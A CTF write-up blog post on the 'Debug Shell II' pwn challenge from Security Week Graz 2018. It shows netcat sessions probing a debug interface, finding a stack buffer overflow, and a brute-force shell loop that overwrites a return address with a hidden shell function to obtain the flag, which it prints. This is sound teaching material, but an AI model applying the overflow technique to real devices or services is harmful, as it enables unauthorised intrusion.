---
layout: post
title: "Security Week Graz 2018: Debug Shell II"
author: sigttou
categories: writeup
tags: [cat/pwn]
---

* **Category:** pwn
* **Points:** 80
* **Description:**

> This is another interesting debug interface I've found on an IoT device. Again, I want to have more!
>
> This time, no binary, but this shouldn't stop you, right? 
>
> Connect to `hacklets2.attacking.systems 8004` to get your real flag. 

# Writeup

Okay, no binary, so let's just connect to the given port and see what it gives us:

```
user@host$ nc hacklets2.attacking.systems 8004
$> help
quit - exit the shell
shell - spawn shell
print <text> - echo the given text
check - dump firmware for self check
$>
```

Nice, there's some `shell`:
```
$> shell
Sorry, shell is only enabled in debug build (0x216e7770)
```

Unlucky us, but what is `0x216e7770`, turning that in a string bytewise is `!nwp`, which is `pwn!` reversed.

Makes, sense. we need to pwn this challenge!

Next, what do other commands give us:

```
$> print
(null)$> print %x 
%x
$> print hi
hi
$> check
/* some skipped binary gibberish*/
$> quit
user@host$
```

Okay, so there's no format string attack possible... `check` gives us the firmware image. let's fetch it and start reversing the returned blob with cutter or radare! 

But first, let's run a 101 buffer overflow check:

```
$> print aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
user@host$
```

Strange, is there an overflow causing the crash? Let's find out how large the buffer is:

```
user@host$ nc hacklets2.attacking.systems 8004
$> print aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
$> print aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
$> print aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
user@host$
```

Could have been automated, but for such short tryings, who cares. So what happens here?

Probably the last a overwrites some address on the stack and therefore kills executions. return addresses are placed on the stack too. So to put the address from the `shell` call on the stack we would need to add `pwn!`.

We again try bruteforcing before actually caring about disassembling the blob:

```
user@host$ for i in $(seq 1 16); do python -c "print 69*'a'+$i*'a'+'pwn!'+'\nquit'" | nc hacklets2.attacking.systems 8004; done
$> $> Bye!
$> $> $> $> $> $> $> $> $> $> {I_L1K3_ASCII_ADDR3SS3S!}
$> $> $> $> $> user@host$
```

So, here we go, simple buffer overflow and a nice set function at `0x216e7770`, no real reversing needed! nice!
